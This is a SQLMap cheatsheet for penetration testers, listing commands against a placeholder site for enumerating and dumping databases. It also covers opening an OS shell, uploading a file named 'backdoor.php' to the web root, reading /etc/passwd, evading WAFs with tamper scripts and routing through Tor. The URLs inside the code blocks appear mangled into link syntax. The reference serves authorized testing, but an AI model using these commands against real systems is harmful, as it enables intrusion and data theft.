# SQLMap Cheatsheet

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

---

## **Basic Usage**

* **Targeting a URL:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)"
    ```

* **Targeting a POST request:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php](http://example.com/vuln.php)" --data="id=1&name=test"
    ```

* **Targeting from a file (e.g., Burp Suite request):**
    ```bash
    sqlmap -r request.txt
    ```

---

## **Enumeration**

* **List databases:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --dbs
    ```

* **List tables for a specific database:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" -D database_name --tables
    ```

* **List columns for a specific table in a specific database:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" -D database_name -T table_name --columns
    ```

* **Dump data from a specific table:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" -D database_name -T table_name --dump
    ```

* **Dump specific columns from a specific table:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" -D database_name -T table_name -C column1,column2 --dump
    ```

* **Dump all data from all databases:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --dump-all
    ```

* **Identify current database user:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --current-user
    ```

* **Identify current database:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --current-db
    ```

* **Check if the current user is a DBA:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --is-dba
    ```

---

## **Techniques & Levels**

* **Specify injection techniques (B=Boolean-based blind, E=Error-based, U=Union query, S=Stacked queries, T=Time-based blind, Q=Inline queries):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --technique=BUEST
    ```
    * By default, sqlmap tests all techniques.

* **Set the level of tests to perform (1-5, default is 1):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --level=3
    ```
    * Higher levels test more payloads and injection points.

* **Set the risk of tests to perform (1-3, default is 1):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --risk=2
    ```
    * Higher risks may include more aggressive payloads that could potentially cause issues.

---

## **Advanced Options**

* **Bypass WAF/IDS with a tamper script:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --tamper=space2plus.py
    ```
    * Refer to `sqlmap/tamper/` directory for available scripts.

* **Set delay between HTTP requests (seconds):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --delay=1
    ```

* **Set timeout before considering an HTTP request as non-responsive (seconds):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --timeout=10
    ```

* **Randomize User-Agent:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --random-agent
    ```

* **Use a specific User-Agent:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --user-agent="MyCustomAgent"
    ```

* **Set a specific cookie:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --cookie="PHPSESSID=abcdef12345"
    ```

* **Save sessions and resume scans:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --session-file=my_session.sqlite
    ```
    * Sqlmap saves sessions automatically in `~/.sqlmap/output/<target_hash>/`.

* **Force the database management system (useful if auto-detection fails):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --dbms=MySQL
    ```
    * Supported DBMS: MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, IBM DB2, Sybase, SAP MaxDB, Informix, HSQLDB, H2, MonetDB, Apache Derby, Firebird, FrontBase, MimerSQL, CUBRID, InterSystems Cache, Vertica, Altibase, Drizzle, Presto, eXtremeDB.

* **Run OS commands:**
    * **Interactive shell:**
        ```bash
        sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --os-shell
        ```
    * **Execute a specific command:**
        ```bash
        sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --os-cmd="whoami"
        ```
        * Requires sufficient privileges and specific database configurations (e.g., `xp_cmdshell` on MSSQL, `sys_exec` on MySQL).

* **Upload/Download files:**
    * **Upload a file:**
        ```bash
        sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --file-write="/path/to/local/file.php" --file-dest="/var/www/html/backdoor.php"
        ```
    * **Download a file:**
        ```bash
        sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --file-read="/etc/passwd"
        ```
        * Requires `LOAD_FILE` on MySQL or similar functionalities.

---

## **Other Useful Options**

* **Verbose output (1-6):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" -v 3
    ```
    * `1`: Show information about the discovery of vulnerable parameters.
    * `2`: Show all tested payloads.
    * `3`: Show injected payloads and their corresponding HTTP responses.
    * `4`: Show HTTP requests and HTTP responses.
    * `5`: Show HTTP requests, HTTP responses and database results.
    * `6`: Show all HTTP traffic.

* **Proxy support:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --proxy="[http://127.0.0.1:8080](http://127.0.0.1:8080)"
    ```

* **Tor support:**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --tor --tor-port=9050 --tor-type=SOCKS5
    ```

* **Disable payload encoding (useful for certain WAF bypasses):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --no-escape
    ```

* **Bypass `magic_quotes_gpc` (for older PHP versions):**
    ```bash
    sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --magic-quotes
    ```

---

## **Web Application Firewall (WAF) Evasion**

* **Generic WAF detection and bypasses are often handled by `--level` and `--risk`.**
* **Tamper scripts are your primary tool for WAF evasion.**
    * `--tamper=space2plus.py`: Replaces spaces with `+`.
    * `--tamper=apostrophemask.py`: Replaces apostrophes with their UTF-8 obfuscated counterpart.
    * `--tamper=charencode.py`: UTF-8 URL-encodes all characters.
    * `--tamper=unionalltounion.py`: Replaces UNION ALL SELECT with UNION SELECT.
    * Many more available in `sqlmap/tamper/`. You can also chain them:
        ```bash
        sqlmap -u "[http://example.com/vuln.php?id=1](http://example.com/vuln.php?id=1)" --tamper="space2plus.py,charencode.py"
        ```

---

## **Cautionary Notes**

* **Always obtain explicit permission before scanning any system.** Unauthorized scanning is illegal and unethical.
* **Be aware of the impact of your scans.** High-risk payloads or aggressive techniques can disrupt services.
* **SQLMap is a powerful tool.** Use it responsibly and ethically.

---